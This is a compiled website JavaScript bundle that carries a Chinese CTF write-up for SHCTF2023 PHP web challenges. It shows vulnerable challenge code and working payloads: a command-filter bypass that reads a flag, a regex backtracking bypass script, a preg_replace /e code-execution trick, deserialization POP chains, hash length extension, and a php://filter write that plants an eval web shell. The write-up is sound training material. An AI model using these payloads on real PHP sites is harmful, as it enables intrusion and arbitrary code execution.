"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[6280],{28453:(e,n,i)=>{i.d(n,{R:()=>l,x:()=>a});var s=i(96540);const c={},r=s.createContext(c);function l(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:l(e.components),s.createElement(r.Provider,{value:n},e.children)}},87213:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>h,contentTitle:()=>a,default:()=>d,frontMatter:()=>l,metadata:()=>s,toc:()=>t});const s=JSON.parse('{"id":"CTF/Misc/SHCTF2023","title":"SHCTF2023","description":"Week1","source":"@site/docs/CTF/Misc/SHCTF2023.md","sourceDirName":"CTF/Misc","slug":"/CTF/Misc/SHCTF2023","permalink":"/docs/CTF/Misc/SHCTF2023","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/CTF/Misc/SHCTF2023.md","tags":[],"version":"current","frontMatter":{},"sidebar":"CTFSidebar","previous":{"title":"PHP\u53cd\u5e8f\u5217\u5316","permalink":"/docs/CTF/Misc/PHP\u53cd\u5e8f\u5217\u5316"},"next":{"title":"ctf-nodejs","permalink":"/docs/CTF/Misc/ctf-nodejs"}}');var c=i(74848),r=i(28453);const l={},a=void 0,h={},t=[{value:"Week1",id:"week1",level:2},{value:"babyRCE",id:"babyrce",level:3},{value:"1zzphp",id:"1zzphp",level:3},{value:"ezphp",id:"ezphp",level:3},{value:"Week2",id:"week2",level:2},{value:"serialize",id:"serialize",level:3},{value:"MD5\u7684\u4e8b\u5c31\u62dc\u6258\u4e86",id:"md5\u7684\u4e8b\u5c31\u62dc\u6258\u4e86",level:3},{value:"WEEK3",id:"week3",level:2},{value:"sseerriiaalliizzee",id:"sseerriiaalliizzee",level:3}];function p(e){const n={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.h2,{id:"week1",children:"Week1"}),"\n",(0,c.jsx)(n.h3,{id:"babyrce",children:"babyRCE"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:'<?php\n$rce = $_GET[\'rce\'];\nif (isset($rce)) {\n    if (!preg_match("/cat|more|less|head|tac|tail|nl|od|vi|vim|sort|flag| |\\;|[0-9]|\\*|\\`|\\%|\\>|\\<|\\\'|\\"/i", $rce)) {\n        system($rce);\n    }else {\n            echo "hhhhhhacker!!!"."\\n";\n    }\n} else {\n    highlight_file(__FILE__);\n}\n'})}),"\n",(0,c.jsxs)(n.p,{children:["\u8fc7\u6ee4\u4e86\u7a7a\u683c\u548c\u4e00\u4e9b\u53c2\u6570\uff0c\u53ef\u4ee5\u7528",(0,c.jsx)(n.code,{children:"${IFS}"}),"\u7ed5\u8fc7\u7a7a\u683c\uff0c\u8f6c\u4e49\u7b26",(0,c.jsx)(n.code,{children:"\\"}),"\u7ed5\u8fc7\u53c2\u6570\u8fc7\u6ee4"]}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"https://www.freebuf.com/articles/web/330736.html",children:"RCE\u603b\u7ed3"})}),"\n",(0,c.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"ca\\t${IFS}/fl\\ag\n"})}),"\n",(0,c.jsx)(n.h3,{id:"1zzphp",children:"1zzphp"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:"<?php \nerror_reporting(0);\nhighlight_file('./index.txt');\nif(isset($_POST['c_ode']) && isset($_GET['num']))\n{\n    $code = (String)$_POST['c_ode'];\n    $num=$_GET['num'];\n    if(preg_match(\"/[0-9]/\", $num)) //\u6570\u7ec4\u7ed5\u8fc7\uff0c\u4f20\u5165\u6570\u7ec4\u662f\u8fd4\u56defalse\n    {\n        die(\"no number!\");\n    }\n    elseif(intval($num)) //\u4f20\u5165\u6570\u7ec4\u4f1a\u8fd4\u56de1\n    {\n      if(preg_match('/.+?SHCTF/is', $code))\n      {\n        die('no touch!');\n      }\n      if(stripos($code,'2023SHCTF') === FALSE)\n      {\n        die('what do you want');\n      }\n      echo $flag;\n    }\n}\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u8fd9\u9898\u5229\u7528\u6b63\u5219\u6700\u5927\u56de\u6eaf\u7ed5\u8fc7\uff0c",(0,c.jsx)(n.code,{children:".+?"}),"\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u8d2a\u5a6a\u6a21\u5f0f"]}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"https://xz.aliyun.com/t/10219",children:"\u5229\u7528\u6b63\u5219\u56de\u6eaf\u6700\u5927\u6b21\u6570\u4e0a\u9650\u7ed5\u8fc7preg_match"})}),"\n",(0,c.jsx)(n.p,{children:"\u7ed5\u8fc7\u811a\u672c"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"import requests\n\npayload = {\n    'c_ode': 'v' * 1000000+'2023SHCTF'\n}\n\nurl = 'http://112.6.51.212:30933/?num[]=1'\n\nres = requests.post(url=url,data=payload)\nprint(res.text)\n"})}),"\n",(0,c.jsx)(n.h3,{id:"ezphp",children:"ezphp"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"$code=$_GET['code'];\npreg_replace('/(' . $pattern . ')/ei','print_r(\"\\\\1\")', $code); \n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u8fd9\u9898\u4e3b\u8981\u662f",(0,c.jsx)(n.code,{children:"preg_replace"}),"\u51fd\u6570\u7684/e\u6a21\u5f0f\u53ef\u4ee5\u6267\u884c\u4ee3\u7801"]}),"\n",(0,c.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"$patrern=\\S*  \\S\u4ee3\u8868\u5339\u914d\u975e\u7a7a\u5b57\u7b26\n$code=${phpinfo()}\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u8d34\u4e2a\u94fe\u63a5"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"https://xz.aliyun.com/t/2557",children:"\u6df1\u5165\u7814\u7a76preg_replace\u4e0e\u4ee3\u7801\u6267\u884c"})}),"\n",(0,c.jsxs)(n.p,{children:["\u4e3a\u4ec0\u4e48\u662f",(0,c.jsx)(n.code,{children:"{phpinfo()}"})]}),"\n",(0,c.jsxs)(n.p,{children:["\u8fd9\u91cc\u662fphp\u53ef\u53d8\u53d8\u91cf\u95ee\u9898\uff0c",(0,c.jsx)(n.code,{children:"{}"}),"\u4f1a\u83b7\u53d6",(0,c.jsx)(n.code,{children:"{}"}),"\u5185\u7684\u503c\u5f53\u4f5c\u53d8\u91cf\u89e3\u6790"]}),"\n",(0,c.jsxs)(n.p,{children:[(0,c.jsx)(n.code,{children:"\\\\1"}),"\u8fd9\u91cc\u5176\u5b9e\u5c31\u662f",(0,c.jsx)(n.code,{children:"\\1"}),"\uff0c\\1\u5728\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u6709\u81ea\u5df1\u7684\u542b\u4e49"]}),"\n",(0,c.jsxs)(n.p,{children:["\u8d34 ",(0,c.jsx)(n.a,{href:"https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html",children:(0,c.jsx)(n.strong,{children:"W3Cschool"})})]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"\u53cd\u5411\u5f15\u7528\n  \u5bf9\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u6a21\u5f0f\u6216\u90e8\u5206\u6a21\u5f0f \u4e24\u8fb9\u6dfb\u52a0\u5706\u62ec\u53f7\u5c06\u5bfc\u81f4\u76f8\u5173\u5339\u914d\u5b58\u50a8\u5230\u4e00\u4e2a\u4e34\u65f6\u7f13\u51b2\u533a \u4e2d\uff0c\u6240\u6355\u83b7\u7684\u6bcf\u4e2a\u5b50\u5339\u914d\u90fd\u6309\u7167\u5728\u6b63\u5219\u8868\u8fbe\u5f0f\u6a21\u5f0f\u4e2d\u4ece\u5de6\u5230\u53f3\u51fa\u73b0\u7684\u987a\u5e8f\u5b58\u50a8\u3002\u7f13\u51b2\u533a\u7f16\u53f7\u4ece 1 \u5f00\u59cb\uff0c\u6700\u591a\u53ef\u5b58\u50a8 99 \u4e2a\u6355\u83b7\u7684\u5b50\u8868\u8fbe\u5f0f\u3002\u6bcf\u4e2a\u7f13\u51b2\u533a\u90fd\u53ef\u4ee5\u4f7f\u7528 '\\n' \u8bbf\u95ee\uff0c\u5176\u4e2d n \u4e3a\u4e00\u4e2a\u6807\u8bc6\u7279\u5b9a\u7f13\u51b2\u533a\u7684\u4e00\u4f4d\u6216\u4e24\u4f4d\u5341\u8fdb\u5236\u6570\u3002\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u6839\u636e\u4e0a\u9762\u7684\u89e3\u91ca\uff0c\u90a3\u8fd9\u91cc\u7684\\1\u5c31\u662f\u7b2c\u4e00\u4e2a\u5339\u914d\u9879\uff0c\u6700\u540e\u7684\u8bed\u53e5\u662f"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.code,{children:"preg_replace('/(\\S*)/ei', 'print_r(\"\\\\1\")', ${phpinfo()});"})}),"\n",(0,c.jsx)(n.h2,{id:"week2",children:"Week2"}),"\n",(0,c.jsx)(n.h3,{id:"serialize",children:"serialize"}),"\n",(0,c.jsx)(n.p,{children:"\u6784\u9020pop\u94fe"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:"<?php\nclass misca{\n    public $gao;\n    public $fei;\n    public $a;\n    public function __get($key){\n        $this->miaomiao();\n        $this->gao=$this->fei;\n        die($this->a);\n    }\n    public function miaomiao(){\n        $this->a='Mikey Mouse~';\n    }\n}\nclass musca{\n    public $ding;\n    public $dong;\n    public function __wakeup(){\n        return $this->ding->dong;\n    }\n}\nclass milaoshu{\n    public $v='php://filter/convert.base64-encode/resource=flag.php';\n    public function __tostring(){\n        echo\"misca~musca~milaoshu~~~\";\n        include($this->v);\n    }\n}\n$c = new musca();\n$c->ding = new misca();\n$c->ding->fei = new milaoshu();\n$c->ding->a = &$c->ding->gao;\n$b = serialize($c);\necho serialize(array($c));\n?>\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u8fd9\u9898\u6700\u91cd\u8981\u7684\u5c31\u662f\u7ed5\u8fc7if(preg_match('/^O:\\d+/',$data))"}),"\n",(0,c.jsx)(n.p,{children:"\u8fd9\u91cc\u7528+\u80fd\u7ed5\u8fc7\u4f46\u662f\u4ee3\u7801\u4e0d\u80fd\u6267\u884c\uff0c\u8fd8\u53ef\u4ee5\u7528\u6570\u7ec4\u7ed5\u8fc7"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"http://t.csdnimg.cn/eWViq",children:"\u5173\u4e8e\u6b63\u5219\u5339\u914dpreg_match(\u2018/^O:\\d+/\u2018)\u7684\u7ed5\u8fc7\u7684\u51e0\u79cd\u65b9\u6cd5"})}),"\n",(0,c.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:'a:1:{i:0;O:5:"musca":2:{s:4:"ding";O:5:"misca":3:{s:3:"gao";N;s:3:"fei";O:8:"milaoshu":1:{s:1:"v";s:52:"php://filter/convert.base64-encode/resource=flag.php";}s:1:"a";R:4;}s:4:"dong";N;}}\n'})}),"\n",(0,c.jsx)(n.h3,{id:"md5\u7684\u4e8b\u5c31\u62dc\u6258\u4e86",children:"MD5\u7684\u4e8b\u5c31\u62dc\u6258\u4e86"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:" <?php\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\nif(isset($_POST['SHCTF'])){\n    extract(parse_url($_POST['SHCTF']));\n    if($$$scheme==='SHCTF'){\n        echo(md5($flag));\n        echo(\"</br>\");\n    }\n    if(isset($_GET['length'])){\n        $num=$_GET['length'];\n        if($num*100!=intval($num*100)){\n            echo(strlen($flag));\n            echo(\"</br>\");\n        }\n    }\n}\nif($_POST['SHCTF']!=md5($flag)){\n    if($_POST['SHCTF']===md5($flag.urldecode($num))){\n        echo(\"flag is\".$flag);\n    }\n}\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u53c2\u8003\uff1a"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"http://t.csdnimg.cn/K7DDF",children:"parse_url\u51fd\u6570\u7684\u89e3\u91ca\u548c\u7ed5\u8fc7"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"https://www.freebuf.com/articles/database/164019.html",children:"Hash\u62d3\u5c55\u957f\u5ea6\u653b\u51fb\u539f\u7406\u5256\u6790"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"https://mp.weixin.qq.com/s/pRGy_yEmyjgTgygEiLSSug",children:"\u5b98\u65b9WP"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:"<?php\n$url = 'host://SHCTF:pass@user/1';\nprint_r(parse_url($url));\n?>\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u8f93\u51fa\uff1a"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"Array\n(\n    [scheme] => host\n    [host] => user\n    [user] => SHCTF\n    [pass] => pass\n    [path] => /1\n)\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u8f93\u5165\u53c2\u6570"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"POST:\nSHCTF=host://SHCTF:pass@user/1   //\u5f97\u5230flag\u7684MD5\nGET:\nlength=1.001  //\u5f97\u5230\u957f\u5ea6\n"})}),"\n",(0,c.jsx)(n.p,{children:"\u6700\u540e\u4e00\u6bb5"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:"if($_POST['SHCTF']!=md5($flag)){\n    if($_POST['SHCTF']===md5($flag.urldecode($num))){\n        echo(\"flag is\".$flag);\n    }\n}\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u770b\u522b\u4eba\u8bf4\u662f\uff0c\u54c8\u5e0c\u62d3\u5c55\u653b\u51fb\uff0c\u7136\u540e\u5728\u7f51\u4e0a\u627e\u4e00\u4e2a\u811a\u672c",(0,c.jsx)(n.a,{href:"https://github.com/shellfeel/hash-ext-attack",children:"hash-ext-attack\u653b\u51fb\u811a\u672c"})]}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231107132329008.png",alt:"image-20231107132329008"})}),"\n",(0,c.jsx)(n.p,{children:"\u5f97\u5230flag"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{src:"https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20231107132425140.png",alt:"image-20231107132425140"})}),"\n",(0,c.jsx)(n.h2,{id:"week3",children:"WEEK3"}),"\n",(0,c.jsx)(n.h3,{id:"sseerriiaalliizzee",children:"sseerriiaalliizzee"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:" <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nclass Start{\n    public $barking;\n    public function __construct(){\n        $this->barking = new Flag;\n    }\n    public function __toString(){\n            return $this->barking->dosomething();\n    }\n}\nclass CTF{ \n    public $part1;\n    public $part2;\n    public function __construct($part1='',$part2='') {\n        $this -> part1 = $part1;\n        $this -> part2 = $part2;\n    }\n    public function dosomething(){\n        $useless   = '<?php die(\"+Genshin Impact Start!+\");?>';\n        $useful= $useless. $this->part2;\n        file_put_contents($this-> part1,$useful);\n    }\n}\nclass Flag{\n    public function dosomething(){\n        include('./flag,php');\n        return \"barking for fun!\";\n    }\n}\n    $code=$_POST['code']; \n    if(isset($code)){\n       echo unserialize($code);\n    }\n    else{\n        echo \"no way, fuck off\";\n    }\n?> \n"})}),"\n",(0,c.jsx)(n.p,{children:"pop\u94fe\u662f\uff1aStart::__tostring->CTF::dosomething"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.a,{href:"https://www.cnblogs.com/yokan/p/12650702.html",children:"file_put_contents\u5229\u7528\u6280\u5de7(php://filter\u534f\u8bae\uff09"})}),"\n",(0,c.jsx)(n.p,{children:"\u5f53\u6211\u4eec\u6267\u884c\u5230die\u51fd\u6570\u662f\u5c31\u4f1a\u88ab\u7ec8\u6b62"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:"<?php die(\"+Genshin Impact Start!+\");?>\u4e2d\uff0cbase64\u7f16\u7801\u4e2d\u53ea\u5305\u542b64\u4e2a\u53ef\u6253\u5370\u5b57\u7b26\uff08A-Z a-z 0-9 + /\uff09'='\u8865\u4f4d\uff0c\u80fdbase64\u89e3\u7801\u7684\u5b57\u7b26\u4e00\u5171\u670926\u4e2aphpdie+GenshinImpactStart+\uff0c\u9700\u8981\u5728\u5f80\u91cc\u6dfb\u52a0\u4e24\u4e2a\u5b57\u7b26\uff0c\u7136\u540e\u518d\u5199\u8fdb\u53bb\u8981\u6267\u884c\u7684\u547d\u4ee4\n"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-php",children:"<?php\nclass Start{\n    public $barking;\n}\nclass CTF{\n    public $part1;\n    public $part2;\n}\nclass Flag{}\n$a = new Start();\n$a->barking = new CTF();\n$a->barking->part1 = 'php://filter/write=convert.base64-decode/resource=cmd.php';\n$a->barking->part2 = '66'.base64_encode('<?php eval($_GET[\"cmd\"]); ?>');\necho serialize($a);\n?>\n"})}),"\n",(0,c.jsx)(n.p,{children:"payload\uff1a"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{children:'O:5:"Start":1:{s:7:"barking";O:3:"CTF":2:{s:5:"part1";s:57:"php://filter/write=convert.base64-decode/resource=cmd.php";s:5:"part2";s:42:"66PD9waHAgZXZhbCgkX0dFVFsiY21kIl0pOyA/Pg==";}}\n'})}),"\n",(0,c.jsx)(n.p,{children:"\u7136\u540e\u83b7\u53d6flag\u5c31\u884c\u4e86"})]})}function d(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(p,{...e})}):p(e)}}}]);